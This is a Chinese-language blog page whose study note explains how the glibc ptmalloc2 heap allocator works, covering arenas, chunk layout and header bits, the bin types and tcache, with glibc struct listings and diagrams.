<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="CharonPt的Blog">
<meta property="og:url" content="https://github.com/CharonPt/CharonPt.github.io.git/page/2/index.html">
<meta property="og:site_name" content="CharonPt的Blog">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://github.com/CharonPt/CharonPt.github.io.git/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>CharonPt的Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">CharonPt的Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/" class="post-title-link" itemprop="url">堆相关</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-03-19 16:48:28" itemprop="dateCreated datePublished" datetime="2022-03-19T16:48:28+08:00">2022-03-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-04-20 11:13:57" itemprop="dateModified" datetime="2022-04-20T11:13:57+08:00">2022-04-20</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="不错的文章"><a href="#不错的文章" class="headerlink" title="不错的文章"></a>不错的文章</h4><p><a target="_blank" rel="noopener" href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/">Understanding glibc malloc – sploitF-U-N (wordpress.com)</a></p>
<h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>堆是存在于程序虚拟地址空间中的一块连续的线性区域，其提供动态分配内存，允许程序申请大小未知的内存。</p>
<p>堆的位置可以是紧贴数据段的上方，也可以是mmap中的某个位置</p>
<h2 id="堆管理器"><a href="#堆管理器" class="headerlink" title="堆管理器"></a>堆管理器</h2><p>堆管理器在用户与操作系统之间作为动态内存管理的中间人，其响应用户申请内存的请求，并向操作系统申请内存，然后将其返回给用户程序。同时其管理用户所释放的内存，适时归还给操作系统。</p>
<p>堆管理器并非由操作系统实现，而是<strong>由libc.so.6链接库</strong>实现，也就是说这段实现的代码存在于libc库中。其中封装了一些系统调用，为用户提供方便的动态内存分配接口的同时，力求高效的管理由系统调用申请来的内存。</p>
<p>不同操作系统的堆管理器也是不一样的</p>
<ul>
<li>dlmalloc - General purpose allocator</li>
<li><strong>ptmalloc2 - glibc</strong></li>
<li>jemalloc - FreeBSD and Firefox</li>
<li>tcmalloc - Google</li>
<li>libumen - Solaris</li>
</ul>
<p>申请内存的系统调用：</p>
<ul>
<li>brk</li>
<li>mmap（memory map - 内存映射）</li>
</ul>
<p>brk系统调用获取内存的方式就是从数据段的末尾（也就是data段的末尾）向上拓展一块空间，这块拓展出来的空间就属于heap段了，每执行一次brk系统调用，就把这块拓展的空间拓展得再大一些，使得堆内存不断地增长。</p>
<p>mmap系统调用用于向操作系统申请一大块内存空间，这块申请得到的空间放在mmap段的某个位置。对于每一块新的内存申请，先在物理内存中开辟其空间，然后再映射到虚拟内存中。</p>
<p>获取堆空间的这两种方式主要由两个要素决定：</p>
<p>主线程可以用brk也可以用mmap，子线程只能用mmap。其次主线程如果申请的内存区域过大的话，会直接用mmap在mmap段得到一块大的空间，如果申请的比较小的话，那么会使用brk直接在数据段上方拓展一块空间。</p>
<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/%E7%9F%A5%E8%AF%86%E7%82%B9-1.png" class>

<p>如上图，程序通过malloc向堆管理器申请内存，堆管理器通过系统调用（brk或mmap）向操作系统申请内存。</p>
<h2 id="堆管理器是如何工作的"><a href="#堆管理器是如何工作的" class="headerlink" title="堆管理器是如何工作的"></a>堆管理器是如何工作的</h2><p>首先需要知道三个关键词</p>
<ul>
<li>arena</li>
<li>chunk</li>
<li>bin</li>
</ul>
<h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h3><blockquote>
<p>在 Linux 的早期，dlmalloc 被用作默认的内存分配器。但后来由于ptmalloc2的线程支持，它成为linux的默认内存分配器。线程支持有助于提高内存分配器性能，从而提高应用程序性能。在dlmalloc中，当两个线程同时调用malloc时，只有一个线程可以进入关键部分，因为freelist数据结构在所有可用线程之间共享。因此，在多线程应用程序中，内存分配需要时间，从而导致性能下降。在 ptmalloc2 中，当两个线程同时调用 malloc 时，会立即分配内存，因为每个线程维护一个单独的堆段，因此维护这些堆的自由列表数据结构（也就是glibc中的bins）也是独立的。为每个线程维护单独的堆和 freelist 数据结构的这种行为称为 <strong>per thread arena</strong></p>
</blockquote>
<p>arena称为内存分配区，可以理解为堆管理器所持有的内存池。堆管理器与用户的内存交易发生在arena中。</p>
<blockquote>
<p>操作系统 –&gt; 堆管理器 –&gt; 用户</p>
<p>物理内存 –&gt; arena –&gt; 可用内存</p>
</blockquote>
<p>例如主个线程在data段上方申请了堆这样一个段，那么在堆段中就会将申请得到的内存组合形成一个arena，这个arena分配区会有一个对应的控制结构来描述这个分配区的相关信息</p>
<p>一个进程可以有多个arena，因为一个进程可以由多个线程构成，当线程较少的时候，arena与每个线程具有一对一映射，但是线程数量超过某个数量（与系统存在的内核数有关）时，glibc malloc在所有可用线程之间共享多个arena（这里涉及到arena上锁的知识，但是好像不重要）。</p>
<p>arena里有一段控制结构，叫<code>malloc _state</code>，该结构的细节如下：</p>
<p><strong>main arena</strong> <strong>的</strong> <strong>malloc_state</strong> <strong>并不是</strong> <strong>heap segment</strong> <strong>的一部分，而是一个全局变量，存储在</strong> <strong>libc.so</strong> <strong>的数据段</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span></span><br><span class="line">    <span class="comment">/* Serialize access.  */</span></span><br><span class="line">    __libc_lock_define(, mutex);    <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">    <span class="keyword">int</span> flags;    <span class="comment">/* Fastbins */</span></span><br><span class="line">    mfastbinptr fastbinsY[ NFASTBINS ];    <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">    mchunkptr top;    <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">    mchunkptr last_remainder;    <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">    mchunkptr bins[ NBINS * <span class="number">2</span> - <span class="number">2</span> ];    <span class="comment">/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[ BINMAPSIZE ];    <span class="comment">/* Linked list, points to the next arena */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span>    <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">       by free_list_lock in arena.c.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span>    <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">       the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">       free_list_lock in arena.c.  */</span></span><br><span class="line">    INTERNAL_SIZE_T attached_threads;    <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">    INTERNAL_SIZE_T system_mem;</span><br><span class="line">    INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>在<code>malloc_state</code>中有两个链表，分别为<code>fastbinY[]</code>和<code>bins[]</code>，<code>fastbinsY[]</code>属于<code>fast bins</code>，而在<code>bins[]</code>中被划分了三个区域，分别属于<code>unsorted bin</code>、<code>small bins</code>和<code>large bins</code></p>
<h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h3><p>一个线程的arena可以有多个堆（除了main_arena），每个堆都有属于自己的header。每个线程的arena在最开始的时候都只有一个堆，但当这个堆空间快用完的时候，新的堆空间（与原来堆空间不连续）就会被mmap()系统调用分配到这个arena中。</p>
<p>main_arena没有多个堆，因此没有heap_info结构。当main_arena的空间不足的时候，其会使用sbrk()系统调用在原来的堆段上扩展空间，直到碰到mmap段。（这里不是很懂，主线程里申请的空间超过阈值时不也会使用mmap吗，那为什么说main_arena没有多个堆）</p>
<h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><p>用户申请内存的单位，也是堆管理器管理内存的基本单位。</p>
<p>glibc中用一个结构体定义了chunk，其中包含6个控制信息，不同的chunk所用到的控制信息的数量不尽相同</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">	INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">	INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line">	<span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="malloced-chunk"><a href="#malloced-chunk" class="headerlink" title="malloced chunk"></a>malloced chunk</h4><p>如<code>void* ptr = malloc(0x100);</code>这条语句执行完毕后就会得到一个malloced chunk。一个malloced chunk的头部有两个字长的控制信息，剩下部分属于数据区域。如下：</p>
<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/%E7%9F%A5%E8%AF%86%E7%82%B9-2.png" class>

<p>malloc()返回的指针指向该chunk的<strong>数据区域</strong></p>
<p>同时当我们<code>malloc(0x100)</code>的时候这个<code>0x100</code>对应的是一个chunk的数据区的大小，而一个malloced chunk还会有两个字长的控制信息，所以实际上得到的是一个<code>0x110</code>大小的chunk</p>
<p>如果上一个chunk是free chunk，那么<code>prev size</code>用来记录这个free chunk的大小，如果上一个chunk是malloced chunk，那么<code>prev size</code>用来存储前一个chunk的数据</p>
<h5 id="prev-size的覆用问题"><a href="#prev-size的覆用问题" class="headerlink" title="prev size的覆用问题"></a>prev size的覆用问题</h5><ul>
<li><p>以64位平台为例，如执行了<code>void* ptr = malloc(0x20);free(ptr);</code>这样的操作后，再次<code>malloc(0x20)</code>的话，堆管理器因为有能刚好满足申请大小的free chunk，所以会把这块free chunk重新返回给用户使用。那么如果<code>malloc(0x28)</code>呢？实际上堆管理器会把下一块紧邻的chunk的prev size部分的一个字长也作为数据区来使用，补足缺少的0x8个字节。这时因为prev size记录的是上一个free chunk的大小，所以当上一个chunk不是free chunk的时候，prev size就不再使用，所以可以用来当作数据区的一部分。所以对于<code>malloc(0xn0)</code>和<code>malloc(0xn8)</code>，堆管理器分配给用户的空间是一样的。当有连续的malloced chunk的时候，往往这些chunk都只有一个字长的控制字段，即<code>size</code>，因为<code>prev size</code>被上一个malloced chunk用作数据区了。</p>
<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/%E7%9F%A5%E8%AF%86%E7%82%B9-4.jpg" class>

<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/%E7%9F%A5%E8%AF%86%E7%82%B9-5.jpg" class></li>
</ul>
<p>这里的<code>size</code>控制信息记录的是自己这个chunk的总大小（包含两个字长的控制信息），同时其最低三位（3bit）同样是控制信息。</p>
<p>为什么能拿这三位用作控制信息？</p>
<p>因为一个malloed chunk的头部有两个字长的控制信息，这就意味着一个malloced chunk的大小至少不会小于八个字节（32位的两个字长），同时chunk分配时遵循一个规则：只能分配字长整数倍的chunk（如字长64位下是8，则malloc得到的chunk只能是8的整数倍），如果申请分配的内存不是字长的整数倍，则堆管理器默认分配能满足申请内存大小且是字长整数倍的内存。这就意味着如果只记录大小的话，<code>size</code>的最低三位一定是0，所以干脆就把这三位用来记录别的控制信息，而不是浪费掉用来写0。</p>
<p>其中<code>A</code>（NON_MAIN_ARENA）记录当前chunk是否不属于主线程，1表示不属于，0表示属于。<code>M</code>（IS_MAPPED）记录该chunk是否由mmap分配的，<code>P</code>(previous in use)代表上一个chunk是否在被使用，如果是1表示上一个chunk是malloced chunk，如果是0表示上一个chunk是free chunk。</p>
<h4 id="free-chunk"><a href="#free-chunk" class="headerlink" title="free chunk"></a>free chunk</h4><p>如<code>free(ptr);</code>这条语句执行完毕后会改变上面语句得到的malloced chunk的结构，而不是令malloced chunk消失，这个free掉的chunk称为free chunk。</p>
<blockquote>
<p>free掉malloc分配的内存后这段内存并不会直接返还给物理内存，而是返回给堆管理器。这里涉及系统调用的问题，因为用户内存和物理内存的交互一定要进行系统调用才能进行，而频繁地进行系统调用会大量消耗资源，以缓冲区为例：</p>
<p>缓冲区的存在就是为了减少系统调用，以stdout为例，若没有缓冲区，程序每接收到一个字符就要申请一次系统调用来向屏幕进行输出，这样会频繁地进行系统调用浪费资源，而缓冲区则是用来暂时存放这些要发送的字符的空间，满足了一定条件后再申请一次系统调用一次性地将缓冲区内的内容输出到屏幕中。</p>
<p>而堆管理器其实也是类似作用，堆管理器作为操作系统和用户交互的中介，堆管理器一次性向操作系统申请超过用户需求的内存空间，然后把这些内存管理起来，这样用户在向堆管理器申请内存或释放内存时就不再需要经过系统调用，这样就大量减少了系统调用的次数。</p>
<p>系统调用消耗资源的原因是从用户态代码切换到内核态代码时需要保存各种状态值和进行各种环境的部署，最后才能执行一个系统调用的函数。</p>
</blockquote>
<p>free chunk根据chunk大小、释放的时机被分成几种：</p>
<ol>
<li>fastbin free chunk</li>
<li>smallbin free chunk</li>
<li>unsortedbin free chunk</li>
<li>largebin free chunk</li>
</ol>
<p>一个chunk被free掉之后会多形成几段控制信息，不同的free chunk所用到的控制信息不尽相同，具体如下图：</p>
<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/free-chunk.jpg" class>

<ul>
<li><p><code>fd</code>（forward）指针在bin中指向下一个（非物理相邻）free chunk</p>
</li>
<li><p><code>bk</code>（backward）指针在bin中指向上一个（非物理相邻）free chunk</p>
</li>
<li><p><code>fd_nextsize</code>在large bin中指向前一个与当前chunk大小不同的第一个free chunk（不包含bin头指针）</p>
<p>（指向比自己小的链表中最大的链表的链头）</p>
<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/fd_nextsize.jpg" class></li>
<li><p><code>bk_nextsize</code>在large bin中指向后一个与当前chunk大小不同的第一个free chunk（不包含bin头指针）</p>
<p>（指向比自己大的链表中最小的链表的链头）</p>
<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/bk_nextsize.jpg" class>

<ul>
<li>一般空闲的large chunk在fd的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适chunk时挨个遍历</li>
</ul>
</li>
</ul>
<p>当一个chunk被free掉时，其会检查<code>size</code>中的<code>P</code>位来判断该chunk的上一个chunk是否也是free chunk，如果同样是free chunk则这两块free chunk会被合并，同时这个free chunk（刚被释放的这个chunk）的所有控制信息会作为合并后的chunk的数据区的一部分，图例如下：</p>
<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/%E7%9F%A5%E8%AF%86%E7%82%B9-3.jpg" class>

<p>有一点要注意的是这个被free掉的chunk中的所有数据在合并前后都不会被抹除，只是被作为合并后的chunk的数据区了。</p>
<h5 id="物理链表"><a href="#物理链表" class="headerlink" title="物理链表"></a>物理链表</h5><p>因为<code>prev size</code>的存在，每个chunk都知道上一个chunk的大小，这样每个chunk就知道上一个chunk的起始地址，以此类推，这样每个内存分配区就知道了自己的分配空间和分配位置</p>
<h5 id="逻辑链表"><a href="#逻辑链表" class="headerlink" title="逻辑链表"></a>逻辑链表</h5><p>有些chunk中存在<code>fd</code>、<code>bk</code>这样的指针，利用这些指针就可以构成一个逻辑链表</p>
<h4 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h4><p>程序第一次进行 malloc 的时候，heap 会被分为两块，一块给用户，剩下的那块就是 top chunk。其实，所谓的 top chunk 就是处于当前堆的物理地址最高的 chunk。这个 chunk 不属于任何一个 bin，它的作用在于当所有的 bin 都无法满足用户请求的大小时，如果其大小不小于指定的大小，就进行分配，并将剩下的部分作为新的 top chunk。否则，就对 heap 进行扩展后再进行分配。在 main arena 中通过 sbrk 扩展 heap，而在 thread arena 中通过 mmap 分配新的 heap。</p>
<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/top-chunk.jpg" class>

<p>需要注意的是，top chunk 的 prev_inuse 比特位始终为 1，否则其前面的 chunk 就会被合并到 top chunk 中。</p>
<h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><p>管理arena中空闲的chunk结构，<strong>以数组的形式存在</strong>，数组元素为相应大小的chunk链表的链表头，存在于arena的malloc_state中。</p>
<ul>
<li>unsorted bin</li>
<li>fast bins</li>
<li>small bins</li>
<li>large bins</li>
<li>（tcache）</li>
</ul>
<h5 id="bin的实现思想"><a href="#bin的实现思想" class="headerlink" title="bin的实现思想"></a>bin的实现思想</h5><p>bin的作用是保管用户暂时不需要的内存空间，当用户需要重新申请内存的时候，bin会在自己的链表中寻找有没有满足需求的chunk，如果bin中有刚好满足需求的chunk，则直接把这块chunk重新分配。</p>
<p>那么要怎么知道bin中有没用正好满足需求的chunk呢？</p>
<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/bin-1.jpg" class>

<p>如上的<code>fast bins</code>：每一个特定大小的bin都是<code>fast bins</code>里的一部分，bin的本质是一个数组，数组中的每一项都对应一个特定大小的chunk链表的链表头，该链表头作为一个指针指向了一个符合其大小的fastbin free chunk，然后这些相同大小的chunk通过指针指向下一个chunk的头部来形成逻辑链表，这条串起来的链表最后形成了一个bin。</p>
<p>对于fast bins，malloc分配内存时返回的就是满足需求大小的bin的链表中的最后一个chunk的数据体的地址，且fast bins中的每一个chunk的size中的P位都为1，这是为了防止chunk的合并等操作导致的速度的下降，这是fast bins的特点之一</p>
<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/bin-2.jpg" class>

<p>fast bins是单向链表，其他类型的bins都是双向链表（fd指针指向下一个chunk，bk指针指向上一个chunk，第一个chunk的bk指针指向bin头，最后一个chunk的fd指针指向bin头）fd和bk其实属于数据体。</p>
<p>双向链表中，最先连接到bins中的chunk最先离开（FIFO）。</p>
<h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4><ul>
<li><p>bins[1]（malloc_state中的bins数组索引为1的元素属于<code>unsorted bin</code>）</p>
</li>
<li><p>可以视为free chunk回归其所属bin之前的缓冲区</p>
</li>
<li><p>unsorted bin 中的空闲 chunk 处于乱序状态，主要有两个来源</p>
<ul>
<li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li>
<li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。</li>
</ul>
</li>
<li><p>此外，Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO 。</p>
</li>
</ul>
<p>结构如下：</p>
<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/unsorted-bin.jpg" class>

<p>unsorted bin的合并：</p>
<p>当有某种特殊情况，例如：用户malloc了一段在large bins范围内的chunk，且未在unsorted bin中找到这样一段满足用户需求的chunk时，就会触发unsorted bin的合并。此时就会遍历整个unsorted bin，并且把可以合并起来的（物理相邻的）chunk合并，合并完成后就把合并的chunk分类到其所属的bin中。</p>
<h4 id="fast-bins"><a href="#fast-bins" class="headerlink" title="fast bins"></a>fast bins</h4><ul>
<li>fastbinsY[]</li>
<li>单向列表</li>
<li>LIFO（last in first out）</li>
<li>管理 16、24、32、40、48、56、64 Byte的free chunk（32位下，64位就乘2）</li>
<li>其中 chunk 的 in use 位（size字段的P位）总为1</li>
<li>默认情况下（<strong>32 位系统为例</strong>）， fastbin 中默认支持最大的 chunk 的数据空间大小为 64 字节。但是其可以支持的 chunk 的数据空间最大为 80 字节。除此之外， fastbin 最多可以支持的 bin 的个数为 10 个，从数据空间为 8 字节开始一直到 80 字节（注意这里说的是数据空间大小，也即除去 prev_size 和 size 字段部分的大小）</li>
</ul>
<p>结构如下：</p>
<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/fast-bins.jpg" class>

<h4 id="small-bins"><a href="#small-bins" class="headerlink" title="small bins"></a>small bins</h4><ul>
<li><p>bins[2] ~ bins[63]</p>
</li>
<li><p>62个循环双向链表</p>
</li>
<li><p>FIFO（first in first out）</p>
</li>
<li><p>管理 16、24、32、40、……、504 Bytes 的 free chunks（32位下）</p>
</li>
<li><p>每个链表中存储的 chunk 大小都一致</p>
</li>
</ul>
<p>结构如下：</p>
<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/small-bins.jpg" class>

<h4 id="large-bins"><a href="#large-bins" class="headerlink" title="large bins"></a>large bins</h4><ul>
<li>bins[64] ~ bins[126]</li>
<li>63个循环双向链表</li>
<li>FIFO</li>
<li>管理大于 504 Bytes 的 free chunks（32位下）</li>
</ul>
<p>结构如下：</p>
<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/large-bins-1.jpg" class>

<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/large-bins-2.jpg" class>

<p>large bins跟其它bins的主要区别在于其每个bin中所管理的chunk的大小都是不固定的（如上图，一个large bin中管理了多个双向链表，同时任意两个链表之间保存的chunk大小都不一样，但是每个链表里保存的chunk大小都相同），也就是说一个large bin会维护一个大小范围内的chunk链表。</p>
<p>同时large bin使用<code>fd_nextsize</code>和<code>bk_nextsize</code>指针来连接大小不同的链表，而每个链表中的chunk用fd和bk指针相互连接。<code>fd_nextsize</code>和<code>bk_nextsize</code>只在每个链表的链表头起作用。</p>
<p>large bin使用FIFO分配策略，将先进入的chunk设置为链头，后面插入chunk在链头的后面，取出时取出链头的下一个chunk。</p>
<p>此外，上述这些 bin 的排布都会遵循一个原则：<strong>任意两个物理相邻的空闲 chunk 不能在一起</strong>。(需要注意的是，并不是所有的 chunk 被释放后就立即被放到 bin 中。ptmalloc 为了提高分配的速度，会把一些小的 chunk <strong>先</strong>放到 fast bins 的容器内。<strong>而且，fastbin 容器中的 chunk 的使用标记总是被置位的，所以不满足上面的原则。</strong>)</p>
<h4 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h4><p>tcache可以理解为super fast bin，其工作模式跟fast bin类似，同样是单向链表。在chunk存放到fast bins之前，所有的chunk都会优先存在到tcache中，tcache也会存放一些特定范围的bins。</p>
<p>在2.26和2.27的libc中，tcache没有double free检查，往后的版本新加了tcache的安全检查。</p>
<h4 id="last-reminder"><a href="#last-reminder" class="headerlink" title="last_reminder"></a>last_reminder</h4><p>刚分配的chunk被分割后剩下的部分</p>
<h3 id="另一些注意的问题"><a href="#另一些注意的问题" class="headerlink" title="另一些注意的问题"></a>另一些注意的问题</h3><p>从<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/heap-structure/">堆相关数据结构 - CTF Wiki</a>]</p>
<blockquote>
<p><strong>最小的 chunk 大小</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The smallest possible chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize))</span></span><br></pre></td></tr></table></figure>

<p>这里，offsetof 函数计算出 fd_nextsize 在 malloc_chunk 中的偏移，说明最小的 chunk 至少要包含 bk 指针。</p>
<p><strong>最小申请的堆内存大小</strong></p>
<p>用户最小申请的内存大小必须是 2 * SIZE_SZ 的最小整数倍。</p>
<p><strong>注：就目前而看 MIN_CHUNK_SIZE 和 MINSIZE 大小是一致的，个人认为之所以要添加两个宏是为了方便以后修改 malloc_chunk 时方便一些。</strong></p>
